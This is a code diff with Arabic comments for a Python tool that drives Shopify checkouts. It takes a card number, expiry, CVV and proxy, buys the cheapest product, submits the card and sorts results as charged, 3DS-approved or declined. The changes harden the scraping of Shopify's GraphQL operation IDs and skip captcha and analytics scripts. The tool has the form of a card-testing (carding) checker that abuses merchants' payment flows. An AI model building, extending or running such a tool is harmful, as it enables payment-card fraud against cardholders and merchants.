@@ -486,46 +486,53 @@ def extract_actions_js_url(checkout_html: str, shop_url: str) -> str:
     استخراج رابط ملف الـ JS اللي فيه GraphQL operation IDs.
     Shopify بيغيّر أسماء الملفات باستمرار، فبنجرب أنماط متعددة.
     """
-    # 1) الأنماط المعتادة داخل checkout-web/assets/c1/
-    patterns = [
-        # النمط الأصلي (actions)
-        r'(/cdn/shopifycloud/checkout-web/assets/c1/actions[A-Za-z0-9_-]*\.[A-Za-z0-9_-]+\.js)',
-        # أي bundle داخل c1/ (index, checkout, main, ...)
-        r'(/cdn/shopifycloud/checkout-web/assets/c1/[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.js)',
-        # أي ملف داخل checkout-web/assets/
-        r'(/cdn/shopifycloud/checkout-web/assets/[A-Za-z0-9_./-]+\.js)',
-        # أي ملف داخل /cdn/shopifycloud/
-        r'(/cdn/shopifycloud/[A-Za-z0-9_./-]+\.js)',
-    ]
+    # 1) نجمع كل ملفات JS من الصفحة
+    all_js = re.findall(r'src="([^"]+\.js[^"]*)"', checkout_html)
 
-    for pattern in patterns:
-        match = re.search(pattern, checkout_html)
-        if match:
-            candidate = match.group(1)
-            # تجاهل الملفات الصغيرة المشكوك فيها (زي الـ polyfills)
-            if any(skip in candidate.lower() for skip in (
-                "polyfill", "vendor", "runtime", "webpack",
-            )):
-                continue
-            if candidate.startswith("http"):
-                return candidate
-            return shop_url + candidate
+    # 2) فلترة: نشيل الملفات المشكوك فيها
+    _SKIP_KEYWORDS = (
+        "polyfill", "vendor", "runtime", "webpack",
+        "analytics", "gtm", "facebook", "hotjar", "consent",
+        "recaptcha", "hcaptcha", "turnstile",
+    )
 
-    # 2) خطة احتياطية: ابحث في كل <script src="..."> عن أي ملف فيه
-    #    checkout أو c1 أو shopifycloud
-    script_srcs = re.findall(r'<script[^>]+src="([^"]+\.js[^"]*)"', checkout_html)
-    for src in script_srcs:
+    candidates: list = []
+    for src in all_js:
         low = src.lower()
-        if "checkout" in low or "c1" in low or "shopifycloud" in low:
-            if src.startswith("http"):
-                return src
-            if src.startswith("/"):
-                return shop_url + src
-            if src.startswith("//"):
-                return "https:" + src
+        if any(skip in low for skip in _SKIP_KEYWORDS):
+            continue
+        # أولوية عالية لملفات checkout-web/assets/c1/
+        if "/cdn/shopifycloud/checkout-web/assets/c1/" in src:
+            candidates.insert(0, src)
+        elif "/cdn/shopifycloud/checkout-web/assets/" in src:
+            candidates.append(src)
+        elif "checkout" in low or "shopifycloud" in low:
+            candidates.append(src)
+
+    # 3) نرجع أول ملف مناسب
+    if candidates:
+        first = candidates[0]
+        if first.startswith("//"):
+            return "https:" + first
+        if first.startswith("/"):
+            return shop_url + first
+        return first
+
+    # 4) خطة احتياطية: أي ملف داخل c1/ مباشرة من الـ HTML
+    for pattern in (
+        r'(/cdn/shopifycloud/checkout-web/assets/c1/[A-Za-z0-9_.-]+\.js)',
+        r'(/cdn/shopifycloud/checkout-web/assets/[A-Za-z0-9_./-]+\.js)',
+        r'(/cdn/shopifycloud/[A-Za-z0-9_./-]+\.js)',
+    ):
+        m = re.search(pattern, checkout_html)
+        if m:
+            url = m.group(1)
+            if url.startswith("//"):
+                return "https:" + url
+            return shop_url + url
 
     return ""
-
+    
 def fetch_actions_js(client: TLSClient, actions_url: str, shop_url: str) -> str:
     headers = {
         "accept": "*/*",
@@ -546,26 +553,93 @@ def fetch_actions_js(client: TLSClient, actions_url: str, shop_url: str) -> str:
     return resp.text
 
 def extract_proposal_id(js_body: str) -> str:
-    match = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"Proposal"', js_body)
-    return match.group(1) if match else ""
-
-def extract_submit_for_completion_id(js_body: str) -> str:
-    match = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"mutation"\s*,\s*name:\s*"SubmitForCompletion"', js_body)
-    return match.group(1) if match else ""
-
-def extract_poll_for_receipt_id(js_body: str) -> str:
+    """
+    استخراج ID عملية Proposal من ملف الـ JS.
+    7 أنماط مختلفة لأن Shopify بتغيّر شكل الكود.
+    """
     patterns = [
-        r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"PollForReceipt"',
-        r'name:\s*"PollForReceipt"\s*,\s*type:\s*"query"\s*,\s*id:\s*"([a-f0-9]{64})"',
-        r'"PollForReceipt"[^}]{0,200}id:\s*"([a-f0-9]{64})"',
-        r'PollForReceipt.{0,300}?([a-f0-9]{64})',
+        # النمط الأصلي
+        r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"Proposal"',
+        # ترتيب مختلف للحقول
+        r'name:\s*"Proposal"\s*,\s*type:\s*"query"\s*,\s*id:\s*"([a-f0-9]{64})"',
+        # بدون مسافات
+        r'id:"([a-f0-9]{64})",type:"query",name:"Proposal"',
+        # JSON style
+        r'"id"\s*:\s*"([a-f0-9]{64})"[^}]{0,200}?"name"\s*:\s*"Proposal"',
+        r'"name"\s*:\s*"Proposal"[^}]{0,200}?"id"\s*:\s*"([a-f0-9]{64})"',
+        # أي hex قريب من Proposal
+        r'Proposal[^a-f0-9]{0,200}?([a-f0-9]{64})',
+        r'([a-f0-9]{64})[^a-f0-9]{0,200}?Proposal',
     ]
     for p in patterns:
-        match = re.search(p, js_body)
+        match = re.search(p, js_body, re.IGNORECASE | re.DOTALL)
         if match:
             return match.group(1)
     return ""
 
+def extract_submit_for_completion_id(js_body: str) -> str:
+    """استخراج ID عملية SubmitForCompletion — 7 أنماط."""
+    patterns = [
+        r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"mutation"\s*,\s*name:\s*"SubmitForCompletion"',
+        r'name:\s*"SubmitForCompletion"\s*,\s*type:\s*"mutation"\s*,\s*id:\s*"([a-f0-9]{64})"',
+        r'id:"([a-f0-9]{64})",type:"mutation",name:"SubmitForCompletion"',
+        r'"id"\s*:\s*"([a-f0-9]{64})"[^}]{0,200}?"name"\s*:\s*"SubmitForCompletion"',
+        r'"name"\s*:\s*"SubmitForCompletion"[^}]{0,200}?"id"\s*:\s*"([a-f0-9]{64})"',
+        r'SubmitForCompletion[^a-f0-9]{0,200}?([a-f0-9]{64})',
+        r'([a-f0-9]{64})[^a-f0-9]{0,200}?SubmitForCompletion',
+    ]
+    for p in patterns:
+        match = re.search(p, js_body, re.IGNORECASE | re.DOTALL)
+        if match:
+            return match.group(1)
+    return ""
+
+def extract_poll_for_receipt_id(js_body: str) -> str:
+    """استخراج ID عملية PollForReceipt — 7 أنماط."""
+    patterns = [
+        r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"PollForReceipt"',
+        r'name:\s*"PollForReceipt"\s*,\s*type:\s*"query"\s*,\s*id:\s*"([a-f0-9]{64})"',
+        r'id:"([a-f0-9]{64})",type:"query",name:"PollForReceipt"',
+        r'"id"\s*:\s*"([a-f0-9]{64})"[^}]{0,200}?"name"\s*:\s*"PollForReceipt"',
+        r'"name"\s*:\s*"PollForReceipt"[^}]{0,200}?"id"\s*:\s*"([a-f0-9]{64})"',
+        r'PollForReceipt[^a-f0-9]{0,200}?([a-f0-9]{64})',
+        r'([a-f0-9]{64})[^a-f0-9]{0,200}?PollForReceipt',
+    ]
+    for p in patterns:
+        match = re.search(p, js_body, re.IGNORECASE | re.DOTALL)
+        if match:
+            return match.group(1)
+    return ""
+def extract_operation_ids_from_manifest(client: TLSClient, shop_url: str) -> dict:
+    """
+    خطة احتياطية: Shopify أحيانًا بتحط الـ operation IDs
+    في ملف manifest منفصل داخل نفس مجلد الـ assets.
+    """
+    try:
+        manifest_urls = [
+            f"{shop_url}/cdn/shopifycloud/checkout-web/assets/c1/manifest.json",
+            f"{shop_url}/cdn/shopifycloud/checkout-web/assets/manifest.json",
+        ]
+        for url in manifest_urls:
+            try:
+                resp = client.get(url, timeout=10)
+            except Exception:
+                continue
+            if resp.status_code != 200:
+                continue
+            text = resp.text
+            ids: dict = {}
+            for op_name in ("Proposal", "SubmitForCompletion", "PollForReceipt"):
+                m = re.search(rf'"{op_name}"\s*:\s*"([a-f0-9]{{64}})"', text)
+                if not m:
+                    m = re.search(rf'([a-f0-9]{{64}})[^a-f0-9]{{0,100}}"{{0,2}}{op_name}', text)
+                if m:
+                    ids[op_name] = m.group(1)
+            if ids:
+                return ids
+    except Exception:
+        pass
+    return {}
 
 # ──────────────────────── Extraction helpers ─────────────────────────
 
@@ -1586,6 +1660,8 @@ def check_submit_errors(status: int, body: str):
 
 # ──────────────────────── Orchestrator ───────────────────────────────
 
+# ──────────────────────── Orchestrator ───────────────────────────────
+
 def run_check(client: TLSClient, shop_url: str, site_name: str,
               email: str, card_number: str, card_month: int, card_year: int, card_cvv: str,
               proxy_url: str = "", currency: str = "USD", country: str = "US") -> CheckResult:
@@ -1596,6 +1672,7 @@ def run_check(client: TLSClient, shop_url: str, site_name: str,
     result.currency  = currency
 
     try:
+        # ═══════════════ Step 0: أرخص منتج ═══════════════
         try:
             title, product_id, variant_id, price = find_cheapest_product(
                 client, shop_url, MIN_PRODUCT_PRICE, MAX_PRODUCT_PRICE
@@ -1605,6 +1682,7 @@ def run_check(client: TLSClient, shop_url: str, site_name: str,
             result.error = Exception(f"Step 0 failed: {e}")
             return result
 
+        # ═══════════════ Step 1: cart → checkout ═══════════════
         try:
             checkout_url, checkout_token, session_token, checkout_html = \
                 add_to_cart_and_checkout(client, shop_url, variant_id)
@@ -1618,6 +1696,7 @@ def run_check(client: TLSClient, shop_url: str, site_name: str,
             result.error = Exception(f"Step 1 failed: {e}")
             return result
 
+        # ═══════════════ Step 2: private access token ═══════════════
         try:
             pat_id = extract_private_access_token_id(checkout_html)
             if not pat_id:
@@ -1628,21 +1707,34 @@ def run_check(client: TLSClient, shop_url: str, site_name: str,
             result.error = Exception(f"Step 2 failed: {e}")
             return result
 
+        # ═══════════════ Step 3: actions JS + operation IDs ═══════════════
         try:
             actions_url = extract_actions_js_url(checkout_html, shop_url)
             if not actions_url:
                 raise Exception("could not find actions JS URL")
+
             js_body     = fetch_actions_js(client, actions_url, shop_url)
             proposal_id = extract_proposal_id(js_body)
             submit_id   = extract_submit_for_completion_id(js_body)
+
+            # خطة احتياطية: لو IDs مش موجودة، دور في الـ manifest
+            if not proposal_id or not submit_id:
+                ids_from_manifest = extract_operation_ids_from_manifest(client, shop_url)
+                if not proposal_id:
+                    proposal_id = ids_from_manifest.get("Proposal", "")
+                if not submit_id:
+                    submit_id = ids_from_manifest.get("SubmitForCompletion", "")
+
             if not proposal_id or not submit_id:
                 raise Exception("missing Proposal or Submit ID")
+
             poll_for_receipt_id = "978b340f3027dc55313349c4089004147b6b0dccee75e42ed97685ef1feae418"
         except Exception as e:
             result.retryable = True
             result.error = Exception(f"Step 3 failed: {e}")
             return result
 
+        # ═══════════════ Step 4: Proposal 1 ═══════════════
         try:
             _, proposal_body = send_proposal(
                 client, shop_url, checkout_url, checkout_token, session_token,
@@ -1668,6 +1760,7 @@ def run_check(client: TLSClient, shop_url: str, site_name: str,
             result.error = Exception(f"Step 4 failed: {e}")
             return result
 
+        # ═══════════════ Step 5: Proposal 2 (email) ═══════════════
         try:
             _, proposal2_body = send_proposal2(
                 client, shop_url, checkout_url, checkout_token, session_token,
@@ -1680,6 +1773,7 @@ def run_check(client: TLSClient, shop_url: str, site_name: str,
             result.error = Exception(f"Step 5 failed: {e}")
             return result
 
+        # ═══════════════ Step 6: Proposal 3 (address) + fallback countries ═══════════════
         addr              = address_for_country(country if country != "US" else "US")
         tried_countries   = [addr.country_code]
         fallback_addrs    = get_fallback_addresses(addr.country_code)
@@ -1725,13 +1819,17 @@ def run_check(client: TLSClient, shop_url: str, site_name: str,
                 break
 
             if not final_proposal_body:
-                raise Exception(f"No shipping available after trying: {tried_countries + [a.country_code for a in fallback_addrs[:fallback_idx]]}")
+                raise Exception(
+                    f"No shipping available after trying: "
+                    f"{tried_countries + [a.country_code for a in fallback_addrs[:fallback_idx]]}"
+                )
 
         except Exception as e:
             result.retryable = True
             result.error = Exception(f"Step 6 failed: {e}")
             return result
 
+        # ═══════════════ Step 7: extract gateway ═══════════════
         try:
             gateways = extract_payment_gateways(final_proposal_body)
             if gateways:
@@ -1744,6 +1842,7 @@ def run_check(client: TLSClient, shop_url: str, site_name: str,
         except Exception:
             pass
 
+        # ═══════════════ Step 8: PCI tokenisation ═══════════════
         try:
             ident_sig = extract_identification_signature(checkout_html)
             if not ident_sig:
@@ -1758,11 +1857,12 @@ def run_check(client: TLSClient, shop_url: str, site_name: str,
             result.error = Exception(f"Step 9 failed: {e}")
             return result
 
+        # ═══════════════ Step 9: SubmitForCompletion ═══════════════
         try:
             is_digital = not extract_is_shipping_required(final_proposal_body)
 
             saved_delivery_handle = extract_delivery_handle(final_proposal_body)
-            
+
             delivery_handle = saved_delivery_handle
             if not delivery_handle and not is_digital:
                 result.retryable = True
@@ -1826,7 +1926,8 @@ def run_check(client: TLSClient, shop_url: str, site_name: str,
                     result.status      = CheckStatus.DECLINED
                     result.status_code = error_msg
                     result.error       = Exception(error_msg)
-                    result.retryable   = any(k in error_msg.lower() for k in ['inventory','retry','try again','generic'])
+                    result.retryable   = any(k in error_msg.lower()
+                                             for k in ['inventory', 'retry', 'try again', 'generic'])
                 else:
                     result.retryable = True
                     result.error = Exception("could not extract receiptId or error message")
@@ -1836,8 +1937,16 @@ def run_check(client: TLSClient, shop_url: str, site_name: str,
             if not receipt_session_token:
                 raise Exception("could not extract sessionToken")
 
+        except Exception as e:
+            result.error = e
+            return result
+
+        # ═══════════════ Step 10: PollForReceipt loop ═══════════════
+        try:
             poll_delay_re = re.compile(r'"pollDelay"\s*:\s*(\d+)')
-            type_name_re = re.compile(r'"__typename"\s*:\s*"(ProcessingReceipt|FailedReceipt|SuccessfulReceipt|ProcessedReceipt|ActionRequiredReceipt)"')
+            type_name_re  = re.compile(
+                r'"__typename"\s*:\s*"(ProcessingReceipt|FailedReceipt|SuccessfulReceipt|ProcessedReceipt|ActionRequiredReceipt)"'
+            )
 
             for poll_num in range(1, 31):
                 _, poll_body = send_poll_for_receipt(
@@ -1853,6 +1962,7 @@ def run_check(client: TLSClient, shop_url: str, site_name: str,
                 status_code = extract_receipt_status_code(poll_body, receipt_type)
                 result.status_code = status_code
 
+                # ─── ORDER PLACED ───
                 if receipt_type in ["SuccessfulReceipt", "ProcessedReceipt"]:
                     result.status      = CheckStatus.CHARGED
                     result.status_code = "ORDER_PLACED"
@@ -1861,11 +1971,13 @@ def run_check(client: TLSClient, shop_url: str, site_name: str,
                     result.paid_site   = shop_url
                     return result
 
+                # ─── 3DS REQUIRED ───
                 if receipt_type == "ActionRequiredReceipt":
-                    result.status = CheckStatus.APPROVED
+                    result.status      = CheckStatus.APPROVED
                     result.status_code = "3DS_AUTHENTICATION"
                     return result
 
+                # ─── FAILED ───
                 if receipt_type == "FailedReceipt":
                     error_code = ""
                     error_re = re.compile(r'"code"\s*:\s*"([^"]+)"')
@@ -1897,6 +2009,7 @@ def run_check(client: TLSClient, shop_url: str, site_name: str,
                         result.error = Exception(f"{error_code}")
                         return result
 
+                # ─── STILL PROCESSING ───
                 delay = 500
                 match = poll_delay_re.search(poll_body)
                 if match:
@@ -1908,7 +2021,7 @@ def run_check(client: TLSClient, shop_url: str, site_name: str,
                         pass
                 time.sleep(min(delay, 300) / 1000.0)
 
-            # ✅ خلصت المحاولات ولسه ProcessingReceipt → صنّفه كـ ERROR (retry)
+            # خلصت 30 محاولة ولسه ProcessingReceipt → ERROR + retry
             result.status      = CheckStatus.ERROR
             result.status_code = "PROCESSING"
             result.error       = Exception("PROCESSING")
